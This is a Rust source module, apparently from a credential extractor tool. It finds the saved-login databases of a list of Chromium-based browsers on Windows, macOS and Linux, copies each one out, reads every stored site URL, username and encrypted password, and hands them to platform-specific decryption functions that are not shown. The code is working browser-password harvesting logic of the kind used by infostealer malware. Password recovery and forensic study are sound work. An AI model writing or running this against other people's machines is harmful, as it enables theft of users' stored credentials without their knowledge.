use std::path::PathBuf;

use serde::Deserialize;

#[cfg(target_os = "linux")]
use dirs::config_dir;
use dirs::data_local_dir;

use rusqlite::{Connection, OpenFlags};

#[cfg(target_os = "macos")]
mod macos;
#[cfg(target_os = "windows")]
mod win;
#[cfg(target_os = "linux")]
mod linux;

mod browsers;
use browsers::KNOWN_BROWSER;

use super::Credential;

use crate::error::{ExtractorError, ExtractorResult};

const TEMP_FILE: &str = "chromium.data";

#[derive(Deserialize)]
pub struct LocalState {
    #[cfg(target_os = "windows")]
    pub os_crypt: OSCrypt,
    // TODO: Profile (at least on Windows) is nested under profiles.info_cache
}

#[cfg(target_os = "windows")]
#[derive(Deserialize)]
pub struct OSCrypt {
    pub encrypted_key: String,
}

pub fn login_credentials() -> ExtractorResult<Vec<Credential>> {
    #[cfg(not(target_os = "linux"))]
    let local_data_dir = data_local_dir().ok_or(ExtractorError::CannotFindLocalDataDirectory)?;
    #[cfg(target_os = "linux")]
    let local_data_dir = config_dir().ok_or(ExtractorError::CannotFindLocalDataDirectory)?;

    let mut credentials = Vec::new();

    for browser in KNOWN_BROWSER {
        // TODO: Handle multiple profiles

        #[cfg(not(target_os = "linux"))]
        let mut dir = local_data_dir.join(browser.paths.iter().collect::<PathBuf>());
        #[cfg(target_os = "linux")]
        let mut dir = local_data_dir.join(browser.linux_paths.iter().collect::<PathBuf>());

        // Windows nests it one deeper.
        #[cfg(target_os = "windows")]
        dir.push("User Data");

        dir.push(["Default", "Login Data"].iter().collect::<PathBuf>());

        if !dir.exists() {
            continue;
        }

        std::fs::copy(&dir, TEMP_FILE)?;

        {
            let login_data = Connection::open_with_flags(
                TEMP_FILE,
                OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
            )?;

            let mut stmt = login_data
                .prepare_cached("SELECT origin_url, username_value, password_value FROM logins")?;

            let mut rows = stmt.query([])?;

            while let Some(row) = rows.next()? {
                let origin_url = row.get::<_, String>(0)?;
                let username_value = row.get::<_, String>(1)?;
                let password_value = row.get::<_, Vec<u8>>(2)?;

                credentials.push(Credential {
                    browser: browser.name.to_string(),
                    url: origin_url,
                    username: username_value,
                    encrypted_password: password_value,
                });
            }
        }

        std::fs::remove_file(TEMP_FILE)?;
    }

    Ok(credentials)
}

pub fn decrypt_credential(credential: &mut Credential) -> ExtractorResult<String> {
    if credential.encrypted_password.len() <= 0 {
        return Ok("".to_string());
    }

    let chromium_browser = KNOWN_BROWSER
        .iter()
        .find(|b| b.name == credential.browser)
        .ok_or(ExtractorError::InvalidBrowser)?;

    #[cfg(target_os = "windows")]
    return win::decrypt_credential(chromium_browser, credential);

    #[cfg(target_os = "macos")]
    return macos::decrypt_credential(chromium_browser, credential);

    #[cfg(target_os = "linux")]
    return linux::decrypt_credential(chromium_browser, credential);
}
